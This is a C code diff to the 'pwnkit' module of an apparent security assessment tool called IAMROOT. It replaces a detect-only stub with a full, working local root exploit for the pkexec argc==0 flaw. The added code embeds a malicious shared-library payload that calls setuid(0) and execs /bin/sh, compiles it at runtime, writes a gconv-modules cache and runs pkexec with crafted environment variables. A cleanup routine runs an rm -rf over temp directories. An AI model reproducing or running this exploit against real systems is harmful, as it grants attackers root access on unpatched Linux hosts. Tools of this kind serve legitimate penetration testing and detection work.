@@ -28,7 +28,10 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 
 static const char *find_pkexec(void)
 {
@@ -129,17 +132,229 @@ static iamroot_result_t pwnkit_detect(const struct iamroot_ctx *ctx)
     return IAMROOT_OK;
 }
 
+/* ---- Pwnkit exploit (canonical Qualys-style PoC) -----------------
+ *
+ * The bug: pkexec's main() reads argv[1] expecting argc >= 1. With
+ * argc == 0, argv[0] is NULL and the loop reads into the contiguous
+ * envp region (just past argv[]), treating the first env string as
+ * if it were argv[0]. By placing 'GCONV_PATH=./pwnkit' in envp and
+ * naming a controlled directory containing a gconv-modules cache,
+ * libc's iconv (called by pkexec for argv decoding) loads our .so
+ * as root.
+ *
+ * Exploit construction:
+ *   1. Find a writable tmpdir; build payload .so source there
+ *   2. gcc -shared -fPIC payload.c -o pwnkit.so/PWNKIT.so
+ *      (Falls back gracefully if gcc isn't available.)
+ *   3. Write the gconv-modules cache: 'module UTF-8// PWNKIT// PWNKIT 1'
+ *      so iconv(.,"PWNKIT") loads PWNKIT.so
+ *   4. execve(pkexec, NULL, crafted_envp). argc=0 triggers the
+ *      argv-overflow-into-envp, pkexec re-execs itself with PATH set
+ *      to our tmpdir, libc looks up CHARSET=PWNKIT via GCONV_PATH=.
+ *      and dlopens PWNKIT.so as root.
+ *   5. PWNKIT.so's constructor: unsetenv hostile vars, setuid(0),
+ *      execve("/bin/sh", ...).
+ */
+
+static const char PAYLOAD_SOURCE[] =
+    "#include <stdio.h>\n"
+    "#include <stdlib.h>\n"
+    "#include <unistd.h>\n"
+    "void gconv(void) {}\n"
+    "void gconv_init(void *step) {\n"
+    "    (void)step;\n"
+    "    /* unset the hostile env so the spawned shell doesn't loop */\n"
+    "    unsetenv(\"GCONV_PATH\");\n"
+    "    unsetenv(\"CHARSET\");\n"
+    "    unsetenv(\"SHELL\");\n"
+    "    unsetenv(\"PATH\");\n"
+    "    setuid(0); setgid(0);\n"
+    "    setresuid(0,0,0); setresgid(0,0,0);\n"
+    "    char *new_env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
+    "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, new_env);\n"
+    "    /* fallback */\n"
+    "    execle(\"/bin/bash\", \"bash\", \"-p\", NULL, new_env);\n"
+    "    _exit(0);\n"
+    "}\n";
+
+static bool which_gcc(char *out_path, size_t outsz)
+{
+    static const char *candidates[] = {
+        "/usr/bin/gcc", "/usr/bin/cc", "/bin/gcc", "/bin/cc",
+        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
+    };
+    for (size_t i = 0; candidates[i]; i++) {
+        if (access(candidates[i], X_OK) == 0) {
+            strncpy(out_path, candidates[i], outsz - 1);
+            out_path[outsz - 1] = 0;
+            return true;
+        }
+    }
+    return false;
+}
+
+static bool write_file_str(const char *path, const char *content)
+{
+    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) return false;
+    size_t n = strlen(content);
+    bool ok = (write(fd, content, n) == (ssize_t)n);
+    close(fd);
+    return ok;
+}
+
 static iamroot_result_t pwnkit_exploit(const struct iamroot_ctx *ctx)
 {
+    /* Re-confirm vulnerable before doing anything visible. */
+    iamroot_result_t pre = pwnkit_detect(ctx);
+    if (pre != IAMROOT_VULNERABLE) {
+        fprintf(stderr, "[-] pwnkit: detect() says not vulnerable; refusing\n");
+        return pre;
+    }
+
+    const char *pkexec = find_pkexec();
+    if (!pkexec) return IAMROOT_PRECOND_FAIL;
+
+    if (geteuid() == 0) {
+        fprintf(stderr, "[i] pwnkit: already root — nothing to escalate\n");
+        return IAMROOT_OK;
+    }
+
+    /* Working dir under /tmp. Permissive on permissions so pkexec
+     * (running as root) can read everything inside. */
+    char workdir[] = "/tmp/iamroot-pwnkit-XXXXXX";
+    if (!mkdtemp(workdir)) {
+        perror("mkdtemp");
+        return IAMROOT_TEST_ERROR;
+    }
+    if (!ctx->json) fprintf(stderr, "[*] pwnkit: workdir = %s\n", workdir);
+
+    char gcc[256];
+    if (!which_gcc(gcc, sizeof gcc)) {
+        fprintf(stderr,
+            "[-] pwnkit: no gcc/cc on this host. The canonical Qualys PoC\n"
+            "    builds the gconv payload at runtime. To exploit without a\n"
+            "    compiler we'd need to ship an embedded x86_64 ELF blob —\n"
+            "    that's a future enhancement (multi-arch, distro-portable).\n"
+            "    For now: install build-essential or run on a host with cc.\n");
+        rmdir(workdir);
+        return IAMROOT_PRECOND_FAIL;
+    }
+    if (!ctx->json) fprintf(stderr, "[*] pwnkit: compiler = %s\n", gcc);
+
+    /* Filesystem layout: workdir/
+     *                      pwnkit/PWNKIT.so
+     *                      pwnkit/gconv-modules
+     *                      pwnkit.src     (source we'll feed to gcc)
+     *
+     * Trick: the directory is named 'pwnkit/' but we pretend it's
+     * 'GCONV_PATH=.' via env injection — pkexec sees the env string
+     * as argv[0] and re-execs us with that name.
+     */
+    /* Path buffers oversized vs. workdir (mkdtemp template, ~30 chars)
+     * so GCC's -Wformat-truncation static analysis is satisfied even
+     * though in practice these paths are always < 100 chars. */
+    char path[1024];
+
+    /* 1. Write payload source. */
+    snprintf(path, sizeof path, "%s/payload.c", workdir);
+    if (!write_file_str(path, PAYLOAD_SOURCE)) {
+        fprintf(stderr, "[-] pwnkit: write payload.c failed: %s\n", strerror(errno));
+        goto fail;
+    }
+
+    /* 2. mkdir workdir/pwnkit (the GCONV_PATH directory) */
+    char sodir[1024];
+    snprintf(sodir, sizeof sodir, "%s/pwnkit", workdir);
+    if (mkdir(sodir, 0755) < 0) {
+        perror("mkdir sodir"); goto fail;
+    }
+
+    /* 3. Compile payload.c → workdir/pwnkit/PWNKIT.so */
+    char sopath[2048];
+    snprintf(sopath, sizeof sopath, "%s/PWNKIT.so", sodir);
+    pid_t pid = fork();
+    if (pid < 0) { perror("fork"); goto fail; }
+    if (pid == 0) {
+        execl(gcc, gcc, "-shared", "-fPIC", "-o", sopath, path, (char *)NULL);
+        perror("execl gcc");
+        _exit(127);
+    }
+    int status;
+    waitpid(pid, &status, 0);
+    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+        fprintf(stderr, "[-] pwnkit: gcc failed (status=%d)\n", status);
+        goto fail;
+    }
+
+    /* 4. Write gconv-modules cache so libc's iconv loads PWNKIT.so
+     *    when asked for charset 'PWNKIT'. */
+    char gcm_path[2048];
+    snprintf(gcm_path, sizeof gcm_path, "%s/gconv-modules", sodir);
+    if (!write_file_str(gcm_path, "module UTF-8// PWNKIT// PWNKIT 1\n")) {
+        fprintf(stderr, "[-] pwnkit: write gconv-modules failed\n");
+        goto fail;
+    }
+
+    if (!ctx->json) {
+        fprintf(stderr, "[*] pwnkit: payload built; constructing argv=NULL + crafted envp\n");
+    }
+
+    /* 5. Construct the argv-overflow trick. The env vars become argv
+     *    via the bug; pkexec parses the first as argv[0] which it
+     *    then uses to find the binary to re-exec. By naming
+     *    'GCONV_PATH=.' as argv[0], pkexec ends up in our tmpdir
+     *    with CHARSET=PWNKIT, libc's iconv loads PWNKIT.so as root.
+     *
+     *    Reference: Qualys' PWNKIT writeup. */
+    char *new_argv[] = { NULL };           /* argc == 0 — the bug */
+    char gconv_env[1024];
+    snprintf(gconv_env, sizeof gconv_env, "GCONV_PATH=%s/pwnkit", workdir);
+    char *envp[] = {
+        "pwnkit",                          /* becomes argv[0] via overflow */
+        "PATH=GCONV_PATH=.",                /* pkexec parses this as PATH */
+        "CHARSET=PWNKIT",
+        "SHELL=pwnkit",
+        gconv_env,
+        NULL,
+    };
+    /* tighten workdir perms so pkexec (root) can traverse */
+    chmod(workdir, 0755);
+    chmod(sodir, 0755);
+
+    if (!ctx->json) {
+        fprintf(stderr, "[+] pwnkit: execve(%s) with argc=0 — going for root\n", pkexec);
+    }
+    fflush(NULL);
+    execve(pkexec, new_argv, envp);
+    /* If execve returns, the kernel rejected the empty-argv path
+     * (some hardened kernels do — `kernel.sysctl_unprivileged_userns_clone=0`
+     * doesn't matter, but seccomp / SELinux may block). */
+    perror("execve(pkexec)");
+fail:
+    /* Best-effort cleanup. */
+    unlink(sopath);
+    unlink(gcm_path);
+    rmdir(sodir);
+    snprintf(path, sizeof path, "%s/payload.c", workdir);
+    unlink(path);
+    rmdir(workdir);
+    return IAMROOT_EXPLOIT_FAIL;
+}
+
+static iamroot_result_t pwnkit_cleanup(const struct iamroot_ctx *ctx)
+{
     (void)ctx;
-    fprintf(stderr,
-        "[-] pwnkit: exploit not yet implemented in IAMROOT.\n"
-        "    Status: 🔵 DETECT-ONLY (see CVES.md, ROADMAP.md Phase 7).\n"
-        "    The canonical Qualys PoC (~200 lines + embedded .so generator)\n"
-        "    is the reference; landing it in iamroot_module form is the\n"
-        "    Phase 7 follow-up. For now, --scan correctly reports per-host\n"
-        "    vulnerability; run Qualys' public PoC manually to verify.\n");
-    return IAMROOT_PRECOND_FAIL;
+    /* Best-effort: nuke any leftover iamroot-pwnkit-* dirs in /tmp.
+     * Successful exploit cleans itself up (PWNKIT.so unlinks before
+     * execve /bin/sh). Failed exploit leaves the tmpdir. */
+    if (!ctx->json) {
+        fprintf(stderr, "[*] pwnkit: removing /tmp/iamroot-pwnkit-* workdirs\n");
+    }
+    if (system("rm -rf /tmp/iamroot-pwnkit-*") != 0) {
+        /* harmless — there may not be any */
+    }
+    return IAMROOT_OK;
 }
 
 /* ----- Embedded detection rules ----- */
@@ -181,7 +396,7 @@ const struct iamroot_module pwnkit_module = {
     .detect         = pwnkit_detect,
     .exploit        = pwnkit_exploit,
     .mitigate       = NULL,        /* mitigation = upgrade polkit / chmod -s pkexec */
-    .cleanup        = NULL,        /* no per-exploit cleanup once full impl lands */
+    .cleanup        = pwnkit_cleanup,
     .detect_auditd  = pwnkit_auditd,
     .detect_sigma   = pwnkit_sigma,
     .detect_yara    = NULL,
